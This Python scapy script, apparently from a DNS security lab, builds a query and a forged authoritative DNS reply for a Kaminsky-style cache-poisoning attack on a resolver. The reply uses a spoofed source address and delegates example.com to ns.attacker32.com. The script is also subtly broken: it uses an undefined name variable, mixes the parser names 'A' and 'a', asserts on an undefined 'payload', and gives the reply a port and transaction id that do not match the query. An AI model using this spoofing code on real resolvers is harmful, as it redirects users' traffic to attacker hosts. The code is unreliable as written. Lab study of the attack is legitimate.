#!/usr/bin/env python3 

from argparse import ArgumentParser
from scapy.all import (
    send, IP, UDP, DNS, DNSQR, DNSRR)


def query():
    ip = IP(dst='10.9.0.53', src='10.9.0.11')
    udp = UDP(dport=53, sport=33333 ,chksum=0)
    dns = DNS(id=0xAAAA, qr=0, qdcount=1,
              ancount=0, nscount=0, arcount=0,
              qd=DNSQR(qname='www.example.com'))
    return ip/udp/dns

def reply():
    domain = "example.com"
    ip = IP(dst='10.9.0.53', src='10.11.0.9')
    udp = UDP(dport=3333, sport=53, chksum=0)
    dns = DNS(id=0xAAA, aa=1, rd=1, qr=1,
              qdcount=1, ancount=1, nscount=1, arcount=0,
              qd=DNSQR(qname=name),
              an=DNSRR(rrname='www.' + name, type='A', rdata='1.2.3.4', ttl=259200),
              ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
    return ip/udp/dns


if __name__ == '__main__':
    A = ArgumentParser()
    a.add_argument('-q', '--query', help='DNS query')
    a.add_argument('-r', '--reply', help='DNS reply')
    args = A.parse_args()

    packet = None
    packet = query() if args.query else packet
    packet = reply() if args.reply else packet
    assert payload, 'DNS packet type not specified'

    send(packet, verbose=0)
